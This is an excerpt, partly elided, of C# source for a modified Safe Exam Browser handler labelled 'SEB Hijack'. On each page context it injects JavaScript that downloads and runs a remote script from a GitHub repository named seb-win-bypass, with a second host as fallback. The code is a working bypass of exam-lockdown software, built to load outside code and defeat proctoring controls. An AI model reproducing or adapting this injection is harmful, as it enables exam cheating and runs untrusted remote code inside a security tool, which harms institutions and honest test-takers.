...
namespace SafeExamBrowser.Browser.Handlers
{
	internal class RenderProcessMessageHandler : IRenderProcessMessageHandler
	{
		...
		public void OnContextCreated(IWebBrowser chromiumWebBrowser, IBrowser browser, IFrame frame)
		{
			...
			var js = @"
				function loadScript(url, completeCallback) {
					...
					script.onerror = function() {
						...
						script2.src = 'https://wxnnvs.ftp.sh/un-seb/the_script.js';
						script2.async = true; // Use async for non-blocking loading

						script2.onload = function() {
							completeCallback();
							// Clean up the script reference
							script2.onload = null; // Prevent memory leaks
						};

						script2.onerror = function() {
							alert('SEB Hijack could not load\nLoading back-up script');
			...
			loadScript('https://raw.githubusercontent.com/wxnnvs/seb-win-bypass/refs/heads/3.8.0/the_script.js', function() {
